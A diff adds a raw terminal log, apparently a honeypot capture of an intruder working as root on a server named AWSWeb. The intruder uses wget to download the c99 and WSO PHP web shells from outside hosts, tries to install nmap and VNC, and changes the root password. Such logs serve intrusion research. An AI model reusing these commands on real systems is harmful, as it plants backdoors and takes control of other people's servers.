@@ -1,0 +1,161 @@
+[4hAWSWeb:~# uname -a
+[4lLinux AWSWeb 2.6.24-2-generic #1 SMP Thu Dec 20 17:36:12 GMT 2007 i686 GNU/Linux
+[4hAWSWeb:~# ww[1D[1Pget www.c99php.com/shell/c99.rar
+[4l--2014-04-09 05:33:22--  http://www.c99php.com/shell/c99.rar
+Connecting to www.c99php.com:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 58759 (57K) [application/x-rar-compressed]
+Saving to: `c99.rar
+
+ 6% [==>                                    ] 3,932        7K/s  eta 7s100%[======================================>] 58,759       7K/s
+
+2014-04-09 05:33:22 (7 KB/s) - `c99.rar' saved [58759/58759]
+[4hAWSWeb:~# unzip c99.rar
+bash: unzip: command not found
+AWSWeb:~# tar -zxvf c99.rar
+[4ltar: this does not look like a tar archive
+tar: skipping to next header
+tar: error exit delayed from previous errors
+[4hAWSWeb:~# [Ktar -zxvf c99.rar[1D[1P[1D[1P[1D[1Prar[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pcd u[1D[1Prar
+[4lbash: cd: rar: No such file or directory
+[4hAWSWeb:~# unrar l c99.rar
+bash: unrar: command not found
+AWSWeb:~# wgwt www[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pet www[1D[1P[1D[1P[1D[1Phttps://github.com/downloads/orbweb/PHP-SHELL-WSO/wso2.5.1.php
+[4lSorry, SSL not supported in this release
+[4hAWSWeb:~# [Kwget https://github.com/downloads/orbweb/PHP-SHELL-WSO/wso2.5.1.php[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1C[1C[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P 
+[4l--2014-04-09 05:37:28--  http://github.com/downloads/orbweb/PHP-SHELL-WSO/wso2.5.1.php
+Connecting to github.com:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 66142 (64K) [application/httpd-php]
+Saving to: `wso2.5.1.php
+
+12% [====>                                  ] 8,390        20K/s  eta 2s100%[======================================>] 66,142       20K/s
+
+2014-04-09 05:37:28 (20 KB/s) - `wso2.5.1.php' saved [66142/66142]
+[4hAWSWeb:~# dir
+bash: dir: command not found
+AWSWeb:~# sydi a[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pudo apt-get instal[1D[1P[1D[1Pall nmap
+bash: sudo: command not found
+AWSWeb:~# [Ksudo apt-get install nmap[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P=[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pwget http://archive.ubuntu.com/ubuntu/pool/main/d/debootstrap/debootstrap_1.0.32_all.deb
+[4l--2014-04-09 05:40:45--  http://archive.ubuntu.com/ubuntu/pool/main/d/debootstrap/debootstrap_1.0.32_all.deb
+Connecting to archive.ubuntu.com:80... connected.
+HTTP request sent, awaiting response... 404 Not Found
+[4hAWSWeb:~# vnc server[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pserver
+bash: vncserver: command not found
+AWSWeb:~# syd[1D[1P[1D[1Pudo apt-get update
+bash: sudo: command not found
+AWSWeb:~# una,[1D[1Pme-[1D[1P -a
+[4lLinux AWSWeb 2.6.24-2-generic #1 SMP Thu Dec 20 17:36:12 GMT 2007 i686 GNU/Linux
+[4hAWSWeb:~# ou[1D[1P[1D[1Pcd
+[4l[4hAWSWeb:~# cd /home[1D[1P[1D[1P[1D[1P[1D[1Pdownloads
+[4lbash: cd: /downloads: No such file or directory
+[4hAWSWeb:~# cd download
+[4lbash: cd: download: No such file or directory
+[4hAWSWeb:~# cd /home/00000[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pcd /home/00000/domains/
+[4lbash: cd: /home/00000/domains/: No such file or directory
+[4hAWSWeb:~# cd downloads/
+[4lbash: cd: downloads/: No such file or directory
+[4hAWSWeb:~# cd ..
+[4l[4hAWSWeb:/# cd ~
+[4lbash: cd: ~: No such file or directory
+[4hAWSWeb:/# ls -alh
+[4ldrwxr-xr-x 1 root root  4096 2014-04-09 05:46 .
+drwxr-xr-x 1 root root  4096 2014-04-09 05:46 ..
+drwxr-xr-x 1 root root     0 2009-11-20 08:19 sys
+drwxr-xr-x 1 root root  4096 2009-11-08 15:42 bin
+drwxr-xr-x 1 root root  4096 2009-11-06 11:08 mnt
+drwxr-xr-x 1 root root  4096 2009-11-06 11:08 media
+lrwxrwxrwx 1 root root    25 2009-11-06 11:16 vmlinuz -> /boot/vmlinuz-2.6.26-2-686
+drwxr-xr-x 1 root root  4096 2009-11-06 11:09 opt
+lrwxrwxrwx 1 root root    11 2009-11-06 11:08 cdrom -> /media/cdrom0
+drwxr-xr-x 1 root root  4096 2009-11-06 11:08 selinux
+drwxrwxrwx 1 root root  4096 2009-11-20 08:19 tmp
+dr-xr-xr-x 1 root root     0 2009-11-20 08:19 proc
+drwxr-xr-x 1 root root  4096 2009-11-08 15:41 sbin
+drwxr-xr-x 1 root root  4096 2009-11-20 08:20 etc
+drwxr-xr-x 1 root root  3200 2009-11-20 08:20 dev
+drwxr-xr-x 1 root root  4096 2009-11-06 11:09 srv
+lrwxrwxrwx 1 root root    28 2009-11-06 11:16 initrd.img -> /boot/initrd.img-2.6.26-2-686
+drwxr-xr-x 1 root root  4096 2009-11-08 15:46 lib
+drwxr-xr-x 1 root root  4096 2009-11-06 11:22 home
+drwxr-xr-x 1 root root  4096 2009-11-06 11:09 var
+drwxr-xr-x 1 root root  4096 2009-11-08 15:46 usr
+drwxr-xr-x 1 root root  4096 2009-11-08 15:39 boot
+drwxr-xr-x 1 root root  4096 2009-11-20 09:08 root
+drwx------ 1 root root 16384 2009-11-06 11:08 lost+found
+[4hAWSWeb:/# mkdir index.pp[1D[1Php
+[4l[4hAWSWeb:/# chmod 777 index.pp[1D[1Php
+[4l[4hAWSWeb:/# cp logo[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pls -alh
+[4ldrwxr-xr-x 1 root root  4096 2014-04-09 05:47 .
+drwxr-xr-x 1 root root  4096 2014-04-09 05:47 ..
+drwxr-xr-x 1 root root     0 2009-11-20 08:19 sys
+drwxr-xr-x 1 root root  4096 2009-11-08 15:42 bin
+drwxr-xr-x 1 root root  4096 2009-11-06 11:08 mnt
+drwxr-xr-x 1 root root  4096 2009-11-06 11:08 media
+lrwxrwxrwx 1 root root    25 2009-11-06 11:16 vmlinuz -> /boot/vmlinuz-2.6.26-2-686
+drwxr-xr-x 1 root root  4096 2009-11-06 11:09 opt
+lrwxrwxrwx 1 root root    11 2009-11-06 11:08 cdrom -> /media/cdrom0
+drwxr-xr-x 1 root root  4096 2009-11-06 11:08 selinux
+drwxrwxrwx 1 root root  4096 2009-11-20 08:19 tmp
+dr-xr-xr-x 1 root root     0 2009-11-20 08:19 proc
+drwxr-xr-x 1 root root  4096 2009-11-08 15:41 sbin
+drwxr-xr-x 1 root root  4096 2009-11-20 08:20 etc
+drwxr-xr-x 1 root root  3200 2009-11-20 08:20 dev
+drwxr-xr-x 1 root root  4096 2009-11-06 11:09 srv
+lrwxrwxrwx 1 root root    28 2009-11-06 11:16 initrd.img -> /boot/initrd.img-2.6.26-2-686
+drwxr-xr-x 1 root root  4096 2009-11-08 15:46 lib
+drwxr-xr-x 1 root root  4096 2009-11-06 11:22 home
+drwxr-xr-x 1 root root  4096 2009-11-06 11:09 var
+drwxr-xr-x 1 root root  4096 2009-11-08 15:46 usr
+drwxr-xr-x 1 root root  4096 2009-11-08 15:39 boot
+drwxr-xr-x 1 root root  4096 2009-11-20 09:08 root
+drwx------ 1 root root 16384 2009-11-06 11:08 lost+found
+drwxr-xr-x 1 root root  4096 2014-04-09 05:46 index.php
+[4hAWSWeb:/# id
+[4luid=0(root) gid=0(root) groups=0(root)
+[4hAWSWeb:/# cls
+bash: cls: command not found
+AWSWeb:/# clear
+[4lc[4hAWSWeb:/# sudo apt-get install tightvncserver
+bash: sudo: command not found
+AWSWeb:/# ifconif[1D[1P[1D[1Pfig
+[4leth0      Link encap:Ethernet  HWaddr 00:4c:a8:ab:32:f4  
+          inet addr:10.98.55.4  Bcast:10.98.55.255  Mask:255.255.255.0
+          inet6 addr: fe80::21f:c6ac:fd44:24d7/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:84045991 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:103776307 errors:0 dropped:0 overruns:0 carrier:2
+          collisions:0 txqueuelen:1000 
+          RX bytes:50588302699 (47.1 GiB)  TX bytes:97318807157 (90.6 GiB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:308297 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:308297 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:355278106 (338.8 MiB)  TX bytes:355278106 (338.8 MiB)
+[4hAWSWeb:/# ./root
+bash: ./root: command not found
+AWSWeb:/# password
+bash: password: command not found
+AWSWeb:/# passwd
+[4lEnter new UNIX password: 
+Retype new UNIX password: 
+passwd: password updated successfully
+[4hAWSWeb:/# yum install vnc vnc-server
+bash: yum: command not found
+AWSWeb:/# clear
+[4lc[4hAWSWeb:/# su
+[4l[4hAWSWeb:/# id
+[4luid=0(root) gid=0(root) groups=0(root)
+[4hAWSWeb:/# logoout[1D[1P[1D[1P[1D[1Put
+[4lcConnection to server closed.
+[4hlocalhost:~# e[1D[1Puname -0a[1D[1P[1D[1Pa
+[4lLinux localhost 2.6.24-2-generic #1 SMP Thu Dec 20 17:36:12 GMT 2007 i686 GNU/Linux
+[4hlocalhost:~# exit
+[4lcConnection to server closed.
+[4hlocalhost:~# logout
+[4lcConnection to server closed.
+[4hlocalhost:~# 
